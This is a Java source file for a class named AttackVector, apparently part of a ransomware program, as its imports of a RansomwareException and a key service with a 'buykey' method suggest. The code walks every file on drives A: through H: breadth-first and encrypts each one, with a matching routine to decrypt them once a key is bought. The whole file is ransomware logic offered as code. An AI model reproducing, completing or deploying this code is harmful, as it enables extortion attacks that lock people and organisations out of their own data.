package Agent.Attack;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Map;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.entites.AlgorithmsMap;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;
import Agent.services.KeyService;
import Agent.traversal.*;

public class AttackVector {

	private KeyService keyService;
	private Cryptable cryptFunc;
	private Collection<File> visitedFolders;

	public void encryptFileSystem() throws RansomwareException {
		Traverse<File> dfs = new DFS<File>();
		// or
		Traverse<File> bfs = new BFS<File>();
		cryptFunc = new EncryptFile();
		for (char i = 'A'; i <= 'H'; i++) {

			traverseAndCrypt(i + ":\\", visitedFolders, keyService.getKey(), bfs, cryptFunc);

		}

	}

	public void decryptFileSystem() throws RansomwareException {
		Traverse<File> dfs = new DFS<File>();
		// or
		Traverse<File> bfs = new BFS<File>();
		cryptFunc = new DecryptFile();
		for (char i = 'A'; i <= 'H'; i++) {
			traverseAndCrypt(i + ":\\", visitedFolders, keyService.buykey(), bfs, cryptFunc);

		}
	}

	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
		return algorithmMap.get(className);
	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {

		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
	}

	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
			Cryptable cryptoFunc) throws RansomwareException {

		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());

		struct.add(new File(inputDir));
		while (!(struct.isEmpty())) {
			/* get next file/directory */
			File current = (File) struct.remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {

						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							struct.add(file);
						}

					} else if (file.isFile()) {

						cryptoFunc.doingCrypto(key, file, crypto);

					}
				}
			}

		}
	}
}
